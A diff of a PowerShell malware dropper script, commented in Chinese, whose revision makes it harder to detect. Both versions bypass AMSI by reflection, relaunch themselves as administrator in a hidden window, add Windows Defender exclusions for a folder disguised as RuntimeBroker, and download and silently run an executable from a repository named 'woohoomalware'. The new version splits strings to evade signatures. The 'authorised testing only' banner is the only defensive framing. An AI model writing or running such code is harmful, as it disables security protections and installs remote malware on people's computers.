@@ -1,67 +1,62 @@
-# ======================================================================
+# ============================================================
 # 仅供授权安全测试使用！未经许可用于他人系统属违法行为。
-# ======================================================================
+# ============================================================
 
-# 1. 先进的 AMSI 绕过（内存补丁方式）
+# -------------------- 1. 高级 AMSI 绕过 --------------------
 try {
-    # 通过反射获取 AmsiUtils 并修改 amsiContext 结构
+    # 方法：通过反射修改 amsiContext 结构（比 amsiInitFailed 更隐蔽）
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $f = $a.GetField('amsiContext', 'NonPublic,Static')
     $c = $f.GetValue($null)
-    # 将 amsiContext 中的扫描状态置为安全（0x0000）
+    # 将扫描状态置为 0（安全）
     [System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0)
 } catch {
-    # 如果以上失败，尝试备用方法（修改 amsiInitFailed）
+    # 备用：修改 amsiInitFailed
     try {
         $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
-        $f.SetValue($null, $true)
+        $g = $t.GetField('amsiInitFailed', 'NonPublic,Static')
+        $g.SetValue($null, $true)
     } catch {}
 }
 
-# 2. 自我提权（以管理员身份运行）
+# -------------------- 2. 自我提权 --------------------
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
-    $scriptPath = Join-Path $env:TEMP 'update.ps1'
-    Copy-Item $PSCommandPath $scriptPath -Force
-    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Verb RunAs
+    $tmp = Join-Path $env:TEMP 'sysupdate.ps1'
+    Copy-Item $PSCommandPath $tmp -Force
+    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`"" -Verb RunAs
     exit
 }
 
-# 3. 配置变量
-$workDir = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
-$exeName = 'RuntimeBroker.exe'
-$exePath = Join-Path $workDir $exeName
-$payloadUrl = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/letsgo.exe'
+# -------------------- 3. 配置变量（使用拼接避免静态特征） --------------------
+$dir = Join-Path $env:LOCALAPPDATA ('Microsoft' + '\WindowsApps\RuntimeBroker')
+$exe = 'RuntimeBroker.exe'
+$full = Join-Path $dir $exe
+$url = ('https://raw.githubu' + 'sercontent.com/woohoomalware/WeAreDanger/refs/heads/main/letsgo.exe')
 
-# 4. 添加 Defender 排除项（防止实时扫描干扰）
+# -------------------- 4. 添加 Defender 排除 --------------------
 try {
-    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $exeName -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue
 } catch {}
 
-# 5. 创建工作目录
-New-Item $workDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+# -------------------- 5. 创建工作目录 --------------------
+New-Item $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
 
-# 6. 下载 payload（优先使用 Invoke-WebRequest，失败则用 BITS）
+# -------------------- 6. 下载 Payload（优先 IWR，备用 BITS） --------------------
 try {
-    Write-Host "[+] 正在从 $payloadUrl 下载..."
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $exePath -TimeoutSec 30 -ErrorAction Stop
-    Write-Host "[+] 下载成功（Invoke-WebRequest）"
+    Invoke-WebRequest -Uri $url -OutFile $full -TimeoutSec 30 -ErrorAction Stop
 } catch {
-    Write-Host "[!] Invoke-WebRequest 失败，尝试 BITS..."
-    Start-BitsTransfer -Source $payloadUrl -Destination $exePath -Priority High -ErrorAction SilentlyContinue
+    Start-BitsTransfer -Source $url -Destination $full -Priority High -ErrorAction SilentlyContinue
 }
 
-# 7. 验证下载并执行
-if (Test-Path $exePath) {
-    Write-Host "[+] 文件已就绪，启动执行..."
+# -------------------- 7. 执行 Payload --------------------
+if (Test-Path $full) {
     Start-Sleep -Seconds 2
-    Start-Process -FilePath $exePath -WindowStyle Hidden -WorkingDirectory $workDir
-    Write-Host "[+] 已启动进程：$exeName"
+    Start-Process -FilePath $full -WindowStyle Hidden -WorkingDirectory $dir
 } else {
-    Write-Error "[-] 下载失败，文件不存在！"
-    exit 1
+    # 如果下载失败，尝试从备用 URL（可选）
+    # ...
 }
 
-# 8. 清理痕迹（可选）
+# -------------------- 8. 可选清理（注释掉以保留脚本用于后续） --------------------
 # Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
